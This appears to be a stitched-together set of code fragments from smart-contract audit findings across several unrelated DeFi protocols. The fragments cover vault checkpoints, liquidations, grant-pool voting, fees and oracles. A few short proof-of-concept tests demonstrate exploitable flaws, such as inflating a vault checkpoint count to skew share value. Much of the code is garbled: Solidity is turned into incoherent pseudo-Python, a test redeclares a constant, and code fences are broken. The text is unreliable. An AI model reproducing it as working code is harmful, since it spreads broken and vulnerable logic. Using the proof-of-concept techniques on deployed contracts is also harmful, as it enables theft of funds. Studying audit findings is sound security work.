"```\nfunction commitRequested(uint256 versionIndex, bytes calldata updateData)\n    public\n    payable\n    keep(KEEPER_REWARD_PREMIUM, KEEPER_BUFFER, updateData, """")\n{\n    if (pythPrice.publishTime <= lastCommittedPublishTime) {\n        revert PythOracleNonIncreasingPublishTimes();\n    }\n    lastCommittedPublishTime = pythPrice.publishTime;\n}\n```\nfunction commit(uint256 versionIndex, uint256 oracleVersion, bytes calldata updateData) external payable {\n    if (\n        versionList.length > versionIndex &&\n        versionIndex >= nextVersionIndexToCommit &&\n        oracleVersion == versionList[versionIndex]\n    ) {\n        commitRequested(versionIndex, updateData);\n        return;\n    }\n\n    if (pythPrice.publishTime <= lastCommittedPublishTime) {\n        revert PythOracleNonIncreasingPublishTimes();\n    }\n    lastCommittedPublishTime = pythPrice.publishTime;\n```"
"```\n// invariant\nif (msg.sender!= account &&!IVaultFactory(address(factory())).operators(account, msg.sender))\n    revert VaultNotOperatorError();\n\n// @audit 0,0,0 is single-sided - pass\nif (!depositAssets.add(redeemShares).add(claimAssets).eq(depositAssets.max(redeemShares).max(claimAssets)))\n    revert VaultNotSingleSidedError();\n\n// @audit depositAssets == 0 - pass\nif (depositAssets.gt(_maxDeposit(context)))\n    revert VaultDepositLimitExceededError();\n\n// @audit redeemShares == 0 - pass\nif (redeemShares.gt(_maxRedeem(context)))\n    revert VaultRedemptionLimitExceededError();\n\n// @audit depositAssets == 0 - pass\nif (!depositAssets.isZero() && depositAssets.lt(context.settlementFee))\n    revert VaultInsufficientMinimumError();\n\n// @audit redeemShares == 0 - pass\nif (!redeemShares.isZero() && context.latestCheckpoint.toAssets(redeemShares, context.settlementFee).isZero())\n    revert VaultInsufficientMinimumError();\n\n// @audit since this will be called by different users in the same epoch, this will also pass\nif (context.local.current!= context.local.latest)\n    revert VaultExistingOrderError();\n```\n```\nfunction _socialize(\n    Context memory context,\n    UFixed6 depositAssets,\n    UFixed6 redeemShares,\n    UFixed6 claimAssets\n) private view returns (UFixed6 claimAmount) {\n    if (context.global.assets.isZero()) {\n        return UFixed6Lib.ZERO;\n    }\n    UFixed6 totalCollateral = UFixed6Lib.from(_collateral(context).max(Fixed6Lib.ZERO));\n    claimAmount = claimAssets.muldiv(totalCollateral.min(context.global.assets), context.global.assets);\n\n    if (depositAssets.isZero() && redeemShares.isZero()) {\n        claimAmount = claimAmount.sub(context.settlementFee);\n    }\n}\n```\n```\nfunction update(Checkpoint memory self, UFixed6 deposit, UFixed6 redemption) internal pure {\n    (self.deposit, self.redemption) = (self.deposit.add(deposit), self.redemption.add(redemption));\n    self.count++;\n}\n\n// update positions\ncontext.global.update(context.currentId, claimAssets, redeemShares, depositAssets, redeemShares);\ncontext.local.update(context.currentId, claimAssets, redeemShares, depositAssets, redeemShares);\ncontext.currentCheckpoint.update(depositAssets, redeemShares);\n```\n```\nfunction processLocal(\n    Account memory self,\n    uint256 latestId,\n    Checkpoint memory checkpoint,\n    UFixed6 deposit,\n    UFixed6 redemption\n) internal pure {\n    self.latest = latestId;\n    (\n        self.assets,\n        self.shares\n    ) = (\n        self.assets.add(checkpoint.toAssetsLocal(redemption)),\n        self.shares.add(checkpoint.toSharesLocal(deposit))\n    );\n    (\n        self.deposit,\n        self.redemption\n    ) = (self.deposit.sub(deposit), self.redemption.sub(redemption));\n}\n\nfunction _withoutKeeperLocal(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n    UFixed6 keeperPer = self.count == 0? UFixed6Lib.ZERO : self.keeper.div(UFixed6Lib.from(self.count));\n    return _withoutKeeper(amount, keeperPer);\n}\n```\n```\nit('inflate checkpoint count', async () => {\n  const settlementFee = parse6decimal('10.00');\n  const marketParameter = await market.parameter();\n  marketParameter.settlementFee = settlementFee;\n  await market.connect(owner).updateParameter(marketParameter);\n\n  const btcMarketParameter = await btcMarket.parameter();\n  btcMarketParameter.settlementFee = settlementFee;\n  await btcMarket.connect(owner).updateParameter(btcMarketParameter);\n\n  const deposit = parse6decimal('10000');\n  await vault.connect(user).update(user.address, deposit, 0, 0);\n  await updateOracle();\n  await vault.settle(user.address);\n\n  const deposit2 = parse6decimal('10000');\n  await vault.connect(user2).update(user2.address, deposit2, 0, 0);\n\n  // Inflate checkpoint count\n  await vault.connect(btcUser1).update(btcUser1.address, 0, 0, 0);\n  await vault.connect(btcUser2).update(btcUser2.address, 0, 0, 0);\n\n  await updateOracle();\n  await vault.connect(user2).settle(user2.address);\n\n  const checkpoint2 = await vault.checkpoints(3);\n  console.log(`checkpoint count = ${checkpoint2.count}`);\n\n  const account = await vault.accounts(user.address);\n  const assets = await vault.convertToAssets(account.shares);\n  console.log(`User shares: ${account.shares} assets: ${assets}`);\n\n  const account = await vault.accounts(user2.address);\n  const assets = await vault.convertToAssets(account.shares);\n  console.log(`User2 shares: ${account.shares} assets: ${assets}`);\n})\n```\ncheckpoint_count = 3\n\nUser shares: 10000000000\nassets: 9990218973\n\nUser2 shares: 10013140463\nassets: 10003346584\n```\n```\ncheckpoint_count = 1\nUser shares: 10000000000 assets: 9990218973\nUser2 shares: 9999780702 assets: 9989999890\n```"
"```\nfunction _latest(\n    IMarket market,\n    address account\n) internal view returns (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) {\n    IPayoffProvider payoff = market.payoff();\n\n    uint256 latestTimestamp = market.oracle().latest().timestamp;\n    latestPosition = market.positions(account);\n    latestPrice = market.global().latestPrice;\n    UFixed6 previousMagnitude = latestPosition.magnitude();\n\n    for (uint256 id = market.locals(account).latestId + 1; id <= market.locals(account).currentId; id++) {\n        Position memory pendingPosition = market.pendingPositions(account, id);\n        pendingPosition.adjust(latestPosition);\n\n        OracleVersion memory oracleVersion = market.oracle().at(pendingPosition.timestamp);\n        if (address(payoff)!= address(0)) oracleVersion.price = payoff.payoff(oracleVersion.price);\n\n        if (pendingPosition.timestamp <= latestTimestamp) {\n            if (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\n            latestPosition.update(pendingPosition);\n            if (oracleVersion.valid) latestPrice = oracleVersion.price;\n\n            previousMagnitude = latestPosition.magnitude();\n            closableAmount = previousMagnitude;\n        } else {\n            closableAmount = closableAmount.sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n            previousMagnitude = latestPosition.magnitude();\n        }\n    }\n}\n```\nmarket.update(\n    account,\n    currentPosition.maker.isZero()? UFixed6Lib.ZERO : currentPosition.maker.sub(closable),\n    currentPosition.long.isZero()? UFixed6Lib.ZERO : currentPosition.long.sub(closable),\n    currentPosition.short.isZero()? UFixed6Lib.ZERO : currentPosition.short.sub(closable),\n    Fixed6Lib.from(-1, liquidationFee),\n    true\n)\n```\nif (protected &&\n    (\n       !closableAmount.isZero() ||\n        context.latestPosition.local.maintained(\n            context.latestVersion,\n            context.riskParameter,\n            collateralAfterFees.sub(collateral)\n        ) ||\n        collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n    )\n) {\n    revert MarketInvalidProtectionError();\n}\n```"
"```\nif not version.valid:\n    context.latestPosition.local.invalidate(newPosition)\nnewPosition.adjust(context.latestPosition.local)\ncontext.latestPosition.local.update(newPosition)\n```\n```\nif not oracleVersion.valid:\n    latestPosition.invalidate(pendingPosition)\nlatestPosition.update(pendingPosition)\n```\npreviousMagnitude = latestPosition.magnitude()\nclosableAmount = previousMagnitude\n```\n```\nmarket.update(\n    account,\n    currentPosition.maker.isZero()? UFixed6Lib.ZERO : currentPosition.maker.sub(closable),\n    currentPosition.long.isZero()? UFixed6Lib.ZERO : currentPosition.long.sub(closable),\n    currentPosition.short.isZero()? UFixed6Lib.ZERO : currentPosition.short.sub(closable),\n    Fixed6Lib.from(-1, liquidationFee),\n    true\n)\n```\nif (protected &&\n    (\n       !closableAmount.isZero() ||\n        context.latestPosition.local.maintained(\n            context.latestVersion,\n            context.riskParameter,\n            collateralAfterFees.sub(collateral)\n        ) ||\n        collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n    )\n) {\n    revert MarketInvalidProtectionError();\n}\n```"
"```\ncontext.currentPosition = registration.market.pendingPosition(global.currentId)\n```\n```\nfunction _positionLimit(\n    MarketContext memory context\n) private pure returns (UFixed6, UFixed6) {\n    return (\n        context.currentAccountPosition.maker.sub(\n            context.currentPosition.maker\n               .sub(context.currentPosition.net().min(context.currentPosition.maker))\n               .min(context.currentAccountPosition.maker)\n               .min(context.closable)\n        ),\n        context.currentAccountPosition.maker.add(\n            context.riskParameter.makerLimit\n               .sub(context.currentPosition.maker.min(context.riskParameter.makerLimit))\n        )\n    );\n}\n```\n```\n(targets[marketId].collateral, targets[marketId].position) = (\n    Fixed6Lib.from(_locals.marketCollateral).sub(\n        contexts[marketId].local.collateral\n    ),\n    _locals.marketAssets\n       .muldiv(\n            registrations[marketId].leverage,\n            contexts[marketId].latestPrice.abs()\n        )\n       .min(_locals.maxPosition)\n       .max(_locals.minPosition)\n)\n```"
"```\nfunction _allocate(bytes memory _data, address _sender) internal virtual override {\n   ...\n\n    if (!_hasVoiceCreditsLeft(voiceCreditsToAllocate, allocator.voiceCredits)) {\n        revert INVALID();\n    }\n\n    _qv_allocate(allocator, recipient, recipientId, voiceCreditsToAllocate, _sender);\n}\n```\n```\nfunction _hasVoiceCreditsLeft(uint256 _voiceCreditsToAllocate, uint256 _allocatedVoiceCredits)\n    internal\n    view\n    override\n    returns (bool)\n{\n    return _voiceCreditsToAllocate + _allocatedVoiceCredits <= maxVoiceCreditsPerAllocator;\n}\n```"
"```\nfunction _registerRecipient(bytes memory _data, address _sender)\n    internal\n    override\n    onlyActiveRegistration\n    returns (address recipientId)\n{\n    uint8 currentStatus = _getUintRecipientStatus(recipientId);\n\n    if (currentStatus == uint8(Status.None)) {\n        recipientToStatusIndexes[recipientId] = recipientsCounter;\n        _setRecipientStatus(recipientId, uint8(Status.Pending));\n\n        bytes memory extendedData = abi.encode(_data, recipientsCounter);\n        emit Registered(recipientId, extendedData, _sender);\n\n        recipientsCounter++;\n    } else {\n        if (currentStatus == uint8(Status.Accepted)) {\n            _setRecipientStatus(recipientId, uint8(Status.Pending));\n        } else if (currentStatus == uint8(Status.Rejected)) {\n            _setRecipientStatus(recipientId, uint8(Status.Appealed));\n        }\n        emit UpdatedRegistration(recipientId, _data, _sender, _getUintRecipientStatus(recipientId));\n    }\n}\n```\n```\nfunction _getUintRecipientStatus(address _recipientId) internal view returns (uint8 status) {\n    (, uint256 colIndex, uint256 currentRow) = _getStatusRowColumn(_recipientId);\n\n    status = uint8((currentRow << colIndex) & 15);\n\n    return status;\n}\n```\nfunction _getStatusRowColumn(address _recipientId) internal view returns (uint256, uint256, uint256) {\n    uint256 recipientIndex = recipientToStatusIndexes[_recipientId];\n\n    uint256 rowIndex = recipientIndex / 64;\n    uint256 colIndex = (recipientIndex % 64) * 4;\n\n    return (rowIndex, colIndex, statusesBitMap[rowIndex]);\n}\n```\n/// @notice The total number of recipients.\nuint256 public recipientsCounter;\n```\n```\ndef _registerRecipient():\n    recipientToStatusIndexes[Alice] = recipientsCounter = 0\n    _setRecipientStatus(Alice, uint8(Status.Pending))\n    recipientCounter += 1\n```\ndef _getStatusRowColumn(recipientToStatusIndexes, recipientId):\n    recipientToStatusIndexes[Bob] = 0\n\ndef _registerRecipient(recipientId):\n    currentStatus = _getUintRecipientStatus(recipientId)\n    if currentStatus!= uint8(Status.None):\n        # no new application is recorded in the pool.\n```"
"```\nfunction test_Audit_createProfile() public {\n    bytes32 newProfileId = registry().createProfile(nonce, name, metadata, profile1_owner(), profile1_members());\n    Registry.Profile memory profile = registry().getProfileById(newProfileId);\n    Anchor _anchor = Anchor(payable(profile.anchor));\n\n    console.log(""registry address: %s"", address(registry()));\n    console.log(""anchor address: %s"", profile.anchor);\n    console.log(""anchor.registry: %s"", address(_anchor.registry()));\n\n    emit log_named_bytes32(""profile.id"", profile.id);\n    emit log_named_bytes32(""anchor.profile.id"", _anchor.profileId());\n\n    Anchor _anchor_proxy = Anchor(payable(address(_anchor.registry())));\n    assertEq(address(registry()), address(_anchor.registry()), ""wrong anchor registry"");\n}\n```\n```\nconstructor(bytes32 _profileId) {\n    registry = Registry(msg.sender);\n    profileId = _profileId;\n}\n```"
"```\n_transferAmountFrom(_token, TransferData({\n    from: msg.sender,\n    to: address(_strategy),\n    amount: amountAfterFee\n}));\n\n_strategy.increasePoolAmount(amountAfterFee)\n```"
```\nfunction _qv_allocate() internal onlyActiveAllocation {\n    uint256 creditsCastToRecipient = _allocator.voiceCreditsCastToRecipient[_recipientId];\n    uint256 totalCredits = _voiceCreditsToAllocate + creditsCastToRecipient;\n    _allocator.voiceCreditsCastToRecipient[_recipientId] += totalCredits;\n}\n```\n```\n_allocator.voiceCreditsCastToRecipient[_recipientId] = (\n    _allocator.voiceCreditsCastToRecipient[_recipientId] +\n    _voiceCreditsToAllocate +\n    _allocator.voiceCreditsCastToRecipient[_recipientId]\n)
```\nif (upcomingMilestone!= 0):\n    revert MILESTONES_ALREADY_SET()\n```
"```\nfunction _fundPool(uint256 _amount, uint256 _poolId, IStrategy _strategy) internal {\n    uint256 feeAmount;\n    uint256 amountAfterFee = _amount;\n\n    Pool storage pool = pools[_poolId];\n    address _token = pool.token;\n\n    if (percentFee > 0) {\n        feeAmount = (_amount * percentFee) / getFeeDenominator();\n        amountAfterFee -= feeAmount;\n\n        _transferAmountFrom(_token, TransferData({from: msg.sender, to: treasury, amount: feeAmount}));\n    }\n\n    _transferAmountFrom(_token, TransferData({from: msg.sender, to: address(_strategy), amount: amountAfterFee}));\n    _strategy.increasePoolAmount(amountAfterFee);\n\n    emit PoolFunded(_poolId, amountAfterFee, feeAmount);\n}\n```\n```\nfeeAmount = (_amount * percentFee) / getFeeDenominator()\n```"
"```\nfunction test_registrationIsBlockedWhenThePoolIsCreatedWithUseRegistryIsTrue() public {\n    bool useRegistryAnchorTrue = true;\n    RFPSimpleStrategy custom_strategy = new RFPSimpleStrategy(address(allo()), ""RFPSimpleStrategy"");\n\n    vm.prank(pool_admin());\n    poolId = allo().createPoolWithCustomStrategy(\n        poolProfile_id(),\n        address(custom_strategy),\n        abi.encode(maxBid, useRegistryAnchorTrue, metadataRequired),\n        NATIVE,\n        0,\n        poolMetadata,\n        pool_managers()\n    );\n\n    vm.startPrank(address(profile1_member1()));\n    vm.expectRevert(abi.encodeWithSelector(RECIPIENT_ERROR.selector, address(profile1_anchor())));\n    allo().registerRecipient(poolId, abi.encode(profile1_anchor(), 1e18, Metadata({protocol: 1, pointer: ""metadata""})));\n}"
"```\nfunction _distribute(\n    address[] memory _addresses,\n    bytes memory _bytes,\n    address _sender\n) \n    internal\n    virtual\n    override\n    onlyInactivePool\n    onlyPoolManager(_sender)\n{\n    IAllo.Pool memory pool = allo.getPool(poolId);\n    Milestone storage milestone = milestones[upcomingMilestone];\n    Recipient memory recipient = _recipients[acceptedRecipientId];\n\n    if (recipient.proposalBid > poolAmount) {\n        revert NOT_ENOUGH_FUNDS();\n    }\n\n    uint256 amount = (recipient.proposalBid * milestone.amountPercentage) / 1e18;\n\n    poolAmount -= amount; // NOTICE the poolAmount get decrease over time\n\n    _transferAmount(pool.token, recipient.recipientAddress, amount);\n}\n```\n```\nif (recipient.proposalBid > poolAmount) {\n    revert NOT_ENOUGH_FUNDS();\n}\n```"
"```\nfunction reviewRecipients(address[] calldata _recipientIds, Status[] calldata _recipientStatuses)\n    external\n    virtual\n    onlyPoolManager(msg.sender)\n    onlyActiveRegistration\n{\n    uint256 recipientLength = _recipientIds.length;\n    if (recipientLength!= _recipientStatuses.length) {\n        revert INVALID();\n    }\n\n    for (uint256 i = 0; i < recipientLength; i++) {\n        Status recipientStatus = _recipientStatuses[i];\n        address recipientId = _recipientIds[i];\n\n        if (recipientStatus == Status.None || recipientStatus == Status.Appealed) {\n            revert RECIPIENT_ERROR(recipientId);\n        }\n\n        reviewsByStatus[recipientId][recipientStatus]++;\n\n        if (reviewsByStatus[recipientId][recipientStatus] >= reviewThreshold) {\n            Recipient storage recipient = recipients[recipientId];\n            recipient.recipientStatus = recipientStatus;\n\n            emit RecipientStatusUpdated(recipientId, recipientStatus, address(0));\n        }\n\n        emit Reviewed(recipientId, recipientStatus, msg.sender);\n    }\n}\n```\n```\nfunction test_reviewRecipient_reviewTreshold_OverwriteTheLastOne() public virtual {\n    address recipientId = __register_recipient();\n\n    address[] memory recipientIds = new address[](1);\n    recipientIds[0] = recipientId;\n    IStrategy.Status[] memory statuses = new IStrategy.Status[](1);\n    statuses[0] = IStrategy.Status.Rejected;\n\n    vm.startPrank(pool_manager1());\n    qvStrategy().reviewRecipients(recipientIds, statuses);\n\n    vm.startPrank(pool_manager2());\n    qvStrategy().reviewRecipients(recipientIds, statuses);\n\n    vm.startPrank(pool_manager3());\n    qvStrategy().reviewRecipients(recipientIds, statuses);\n\n    assertEq(uint8(qvStrategy().getRecipientStatus(recipientId)), uint8(IStrategy.Status.Rejected));\n    assertEq(qvStrategy().reviewsByStatus(recipientId, IStrategy.Status.Rejected), 3);\n\n    statuses[0] = IStrategy.Status.Accepted;\n    vm.startPrank(pool_admin());\n    qvStrategy().reviewRecipients(recipientIds, statuses);\n\n    vm.startPrank(pool_manager4());\n    qvStrategy().reviewRecipients(recipientIds, statuses);\n\n    assertEq(uint8(qvStrategy().getRecipientStatus(recipientId)), uint8(IStrategy.Status.Accepted));\n    assertEq(qvStrategy().reviewsByStatus(recipientId, IStrategy.Status.Rejected), 3);\n    assertEq(qvStrategy().reviewsByStatus(recipientId, IStrategy.Status.Accepted), 2);\n}\n```\n```\nRunning 1 test for test/foundry/strategies/QVSimpleStrategy.t.sol:QVSimpleStrategyTest\n[PASS] test_reviewRecipient_reviewTreshold_OverwriteTheLastOne() (gas: 249604)\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.92ms"
"```\npragma solidity ^0.8.0;\n\nimport ""./MiniContract.sol"";\nimport ""./CREATE3.sol"";\n\ncontract DeployTest {\n    address public deployedAddress;\n    event Deployed(address);\n\n    function generateContract() public returns (address, address) {\n        bytes32 salt = keccak256(""SALT"");\n\n        address preCalculatedAddress = CREATE3.getDeployed(salt);\n\n        bytes memory creationCode = abi.encodePacked(type(MiniContract).creationCode, abi.encode(777));\n\n        address deployed = CREATE3.deploy(salt, creationCode, 0);\n        return (preCalculatedAddress, deployed);\n    }\n}\n```\n```\naddress => keccak256(\n    keccak256(""zksyncCreate2"") => 0x2020dba91b30cc0006188af794c2fb30dd8520db7e2c088b7fc7c103c00ca494,\n    sender,\n    salt,\n    keccak256(bytecode),\n    keccak256(constructorInput)\n)\n```"
"```\npragma solidity 0.8.19;\n\nimport {Registry} from ""./Registry.sol"";\n\ncontract Anchor {\n    // Storage Variables\n    Registry public immutable registry;\n    bytes32 public immutable profileId;\n\n    // Errors\n    error UNAUTHORIZED();\n    error CALL_FAILED();\n\n    // Constructor\n    constructor(bytes32 _profileId) {\n        registry = Registry(msg.sender);\n        profileId = _profileId;\n    }\n\n    // External Functions\n    function execute(address _target, uint256 _value, bytes memory _data) external returns (bytes memory) {\n        if (!registry.isOwnerOfProfile(profileId, msg.sender)) {\n            revert UNAUTHORIZED();\n        }\n        if (_target == address(0)) {\n            revert CALL_FAILED();\n        }\n        (bool success, bytes memory data) = _target.call{value: _value}(_data);\n        if (!success) {\n            revert CALL_FAILED();\n        }\n        return data;\n    }\n\n    // Receive native token\n    receive() external payable {}\n}\n```"
"```\n{\n  ""@openzeppelin/contracts"": ""4.3.1"",\n  ""@openzeppelin/test-helpers"": ""0.5.6"",\n  ""@openzeppelin/contracts-upgradeable"": ""4.3.1""\n}\n```"
"```\nrequire(\n  msg.sender == address(_getPool(tokenIn, tokenOut, fee)),\n  'Router: invalid callback sender'\n);\n```\nfunction _getPool(\n    address tokenA,\n    address tokenB,\n    uint24 fee\n) private view returns (IPool) {\n    return IPool(\n        PoolAddress.computeAddress(\n            factory,\n            tokenA,\n            tokenB,\n            fee,\n            poolInitHash\n        )\n    );\n}\n```"
"```\nif (LibQuote.quoteOpenAmount(quote)!= quote.quantityToClose):\n    require(\n        quote.lockedValues.total() >= symbolLayout.symbols[quote.symbolId].minAcceptableQuoteValue,\n        ""LibQuote: Remaining quote value is low""\n    )\n```"
"```\nAccountFacetImpl.deposit(msg.sender, amount);\nuint256 amountWith18Decimals = (amount * 1e18) / (10 ** IERC20Metadata(GlobalAppStorage.layout().collateral).decimals());\nAccountFacetImpl.allocate(amountWith18Decimals);\n```\n```\nISymmio(symmioAddress).depositFor(account, amount);\nbytes memory _callData = abi.encodeWithSignature(\n    ""allocate(uint256)"",\n    amount\n);\ninnerCall(account, _callData);\n```"
"```\nfunction chargeFundingRate(\n    address partyA,\n    uint256[] memory quoteIds,\n    int256[] memory rates,\n    PairUpnlSig memory upnlSig\n) internal {\n    LibMuon.verifyPairUpnl(upnlSig, msg.sender, partyA);\n    require(quoteIds.length == rates.length, ""PartyBFacet: Length not match"");\n    int256 partyBAvailableBalance = LibAccount.partyBAvailableBalanceForLiquidation(\n        upnlSig.upnlPartyB,\n        msg.sender,\n        partyA\n    );\n    int256 partyAAvailableBalance = LibAccount.partyAAvailableBalanceForLiquidation(\n        upnlSig.upnlPartyA,\n        partyA\n    );\n    uint256 epochDuration;\n    uint256 windowTime;\n\n    for (uint256 i = 0; i < quoteIds.length; i++) {\n        // rest of code\n    }\n\n    require(partyAAvailableBalance >= 0, ""PartyBFacet: PartyA will be insolvent"");\n    require(partyBAvailableBalance >= 0, ""PartyBFacet: PartyB will be insolvent"");\n    AccountStorage.layout().partyBNonces[msg.sender][partyA] += 1;\n    AccountStorage.layout().partyANonces[partyA] += 1;\n}\n```\n```\nfunction forceClosePosition(uint256 quoteId, PairUpnlAndPriceSig memory upnlSig) internal {\n    AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n    MAStorage.Layout storage maLayout = MAStorage.layout();\n    Quote storage quote = QuoteStorage.layout().quotes[quoteId];\n    LibMuon.verifyPairUpnlAndPrice(upnlSig, quote.partyB, quote.partyA, quote.symbolId);\n}\n```"
"```\nFile: SwEthEthOracle.sol\n\ncontract SwEthEthOracle is SystemComponent, IPriceOracle {\n    /**\n     * @notice Price oracle specifically for swEth (Swell Eth).\n     * @dev getPriceEth is not a view fn to support reentrancy checks. Does not actually change state.\n     */\n```\n```\nFile: RootOracleIntegrationTest.sol\n\nswEthOracle = new SwEthEthOracle(systemRegistry, IswETH(SWETH_MAINNET));\n\n// Lst special pricing case setup\npriceOracle.registerMapping(WSTETH_MAINNET, IPriceOracle(address(wstEthOracle)));\npriceOracle.registerMapping(SWETH_MAINNET, IPriceOracle(address(swEthOracle)));\n```\n```\nFile: SwEthEthOracle.sol\n\nfunction getPriceInEth(address token) external view returns (uint256 price) {\n    // Returns in 1e18 precision.\n    price = swEth.swETHToETHRate();\n}\n```\n```\nfunction calculateEthPerToken() public view override returns (uint256) {\n    return IswETH(lstTokenAddress).swETHToETHRate();\n}\n```\n```\nfunction current() external returns (LSTStatsData memory) {\n    IRootPriceOracle pricer = systemRegistry.rootPriceOracle();\n    uint256 price = pricer.getPriceInEth(lstTokenAddress);\n\n    uint256 backing = calculateEthPerToken();\n    // price is always 1e18 and backing is in eth, which is 1e18\n    priceToBacking = price * 1e18 / backing;\n\n    // positive value is a premium; negative value is a discount\n    int256 premium = int256(priceToBacking) - 1e18;\n\n    return LSTStatsData({\n        lastSnapshotTimestamp: lastSnapshotTimestamp,\n        baseApr: baseApr,\n        premium: premium,\n        slashingCosts: slashingCosts,\n        slashingTimestamps: slashingTimestamps\n    });\n}"
"```\nFile: LMPDebt.sol\n\nif (currentDvDebtValue < updatedDebtBasis) {\n    // We are currently sitting at a loss. Limit the value we can pull from the destination vault\n    currentDvDebtValue = currentDvDebtValue.mulDiv(userShares, totalVaultShares, Math.Rounding.Down);\n    currentDvShares = currentDvShares.mulDiv(userShares, totalVaultShares, Math.Rounding.Down);\n}\n```"
"```\nfunction getTellorCurrentValue(bytes32 _queryId)\n    {\n    // retrieve most recent 20+ minute old value for a queryId. the time buffer allows time for a bad value to be disputed\n    (, bytes memory data, uint256 timestamp) = tellor.getDataBefore(_queryId, block.timestamp - 20 minutes);\n    uint256 _value = abi.decode(data, (uint256));\n    if (timestamp == 0 || _value == 0) {\n        return (false, _value, timestamp);\n    }\n}\n```\n```\nfunction getPriceInEth(address tokenToPrice) external returns (uint256) {\n    TellorInfo memory tellorInfo = _getQueryInfo(tokenToPrice);\n    uint256 timestamp = block.timestamp;\n\n    (bytes memory value, uint256 timestampRetrieved) = getDataBefore(tellorInfo.queryId, timestamp - 30 minutes);\n\n    uint256 tellorStoredTimeout = uint256(tellorInfo.pricingTimeout);\n    uint256 tokenPricingTimeout = tellorStoredTimeout == 0? DEFAULT_PRICING_TIMEOUT : tellorStoredTimeout;\n\n    if (timestampRetrieved == 0 || timestamp - timestampRetrieved > tokenPricingTimeout) {\n        revert InvalidDataReturned();\n    }\n\n    uint256 price = abi.decode(value, (uint256));\n    return _denominationPricing(tellorInfo.denomination, price, tokenToPrice);\n}\n```"
"```\n/// @inheritdoc ILMPVaultRouterBase\nfunction deposit(\n    ILMPVault vault,\n    address to,\n    uint256 amount,\n    uint256 minSharesOut\n) public payable virtual override returns (uint256 sharesOut) {\n    _processEthIn(vault);\n\n    IERC20 vaultAsset = IERC20(vault.asset());\n    pullToken(vaultAsset, amount, address(this));\n\n    return _deposit(vault, to, amount, minSharesOut);\n}\n```\n```\nfunction _processEthIn(ILMPVault vault) internal {\n    if (msg.value > 0) {\n        if (address(vault.asset())!= address(weth9)) {\n            revert InvalidAsset();\n        }\n\n        weth9.deposit{ value: msg.value }();\n    }\n}\n```\nfunction pullToken(IERC20 token, uint256 amount, address recipient) public payable {\n    token.safeTransferFrom(msg.sender, recipient, amount);\n}\n```\n```\nfunction sweepToken(IERC20 token, uint256 amountMinimum, address recipient) public payable {\n    uint256 balanceToken = token.balanceOf(address(this));\n    if (balanceToken < amountMinimum) {\n        revert InsufficientToken();\n    }\n\n    if (balanceToken > 0) {\n        token.safeTransfer(recipient, balanceToken);\n    }\n}\n```"
"```\nuint256 assetPreBal = _baseAsset.balanceOf(address(this));\nuint256 assetPulled = destVault.withdrawBaseAsset(sharesToBurn, address(this));\n\ninfo.idleIncrease += _baseAsset.balanceOf(address(this)) - assetPreBal - assetPulled;\ninfo.totalAssetsPulled += assetPulled;\ninfo.debtDecrease += totalDebtBurn;\n\nif (info.totalAssetsPulled > info.totalAssetsToPull) {\n    info.idleIncrease = info.totalAssetsPulled - info.totalAssetsToPull;\n    info.totalAssetsPulled = info.totalAssetsToPull;\n    break;\n}\n```\n```\npreBal = 100\npulled = 10\nreward = 5\ntoPull = 6\n\nidleIncrease = 115 - 100 - 10\nidleIncrease = 5\n\ntotalPulled(0) += assetPulled\nif assetPulled > toPull:\n    totalPulled(0) = totalPulled(0) + assetPulled\n    idleIncrease = totalPulled(0) - toPull\n    if idleIncrease < reward:\n        # No change\n        pass\n    else:\n        # No change\n        pass\n```"
"```\nfunction liquidateVaultsForToken(\n    address fromToken,\n    address asyncSwapper,\n    IDestinationVault[] memory vaultsToLiquidate,\n    SwapParams memory params\n) external nonReentrant hasRole(Roles.LIQUIDATOR_ROLE) onlyWhitelistedSwapper(asyncSwapper) {\n    uint256 gasBefore = gasleft();\n\n    (uint256 totalBalanceToLiquidate, uint256[] memory vaultsBalances) = \n        _prepareForLiquidation(fromToken, vaultsToLiquidate);\n\n    _performLiquidation(\n        gasBefore, \n        fromToken, \n        asyncSwapper, \n        vaultsToLiquidate, \n        params, \n        totalBalanceToLiquidate, \n        vaultsBalances\n    );\n}\n```\n```\nfunction _performLiquidation(\n    uint256 gasBefore,\n    address fromToken,\n    address asyncSwapper,\n    IDestinationVault[] memory vaultsToLiquidate,\n    SwapParams memory params,\n    uint256 totalBalanceToLiquidate,\n    uint256[] memory vaultsBalances\n) private {\n    uint256 length = vaultsToLiquidate.length;\n    uint256 amountReceived = IAsyncSwapper(asyncSwapper).swap(params);\n}\n```"
"```\nfunction queueNewRewards(uint256 newRewards) external onlyWhitelisted {\n    uint256 startingQueuedRewards = queuedRewards;\n    uint256 startingNewRewards = newRewards;\n\n    newRewards += startingQueuedRewards;\n\n    if (block.number >= periodInBlockFinish) {\n        notifyRewardAmount(newRewards);\n        queuedRewards = 0;\n    } else {\n        uint256 elapsedBlock = block.number - (periodInBlockFinish - durationInBlock);\n        uint256 currentAtNow = rewardRate * elapsedBlock;\n        uint256 queuedRatio = currentAtNow * 1000 / newRewards;\n\n        if (queuedRatio < newRewardRatio) {\n            notifyRewardAmount(newRewards);\n            queuedRewards = 0;\n        } else {\n            queuedRewards = newRewards;\n        }\n    }\n\n    emit QueuedRewardsUpdated(startingQueuedRewards, startingNewRewards, queuedRewards);\n\n    IERC20(rewardToken).safeTransferFrom(msg.sender, address(this), newRewards);\n}\n```"
"```\npublic constant address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n\n// rest of code\n\nif (checkReentrancy) {\n    if (tokens[0]!= ETH && tokens[1]!= ETH) {\n        revert MustHaveEthForReentrancy();\n    }\n}\n```\n```\ndef exchange(i: uint256, j: uint256, dx: uint256, min_dy: uint256, use_eth: bool = False) -> uint256:\n\ndef add_liquidity(amounts: uint256, min_mint_amount: uint256, use_eth: bool = False) -> uint256:\n\ndef remove_liquidity(_amount: uint256, min_amounts: uint256, use_eth: bool = False):\n    pass\n\ndef remove_liquidity_one_coin(token_amount: uint256, i: uint256, min_amount: uint256, use_eth: bool = False) -> uint256:\n```\n```\nif (poolInfo.checkReentrancy == 1):\n    cryptoPool.claim_admin_fees()\n```"
